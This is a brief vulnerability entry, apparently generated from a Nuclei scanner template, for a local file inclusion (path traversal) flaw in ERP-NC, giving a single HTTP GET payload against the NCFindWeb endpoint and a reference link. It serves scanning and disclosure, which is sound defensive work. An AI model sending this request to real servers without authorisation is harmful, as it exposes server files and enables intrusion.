# Nuclei Template: ERP-NC - Local File Inclusion
**Template ID:** erp-nc-directory-traversal
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`erp-nc-directory-traversal.yaml`)

## Vulnerability Information & PoC

## Description
ERP-NC is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=
```

## References
- https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
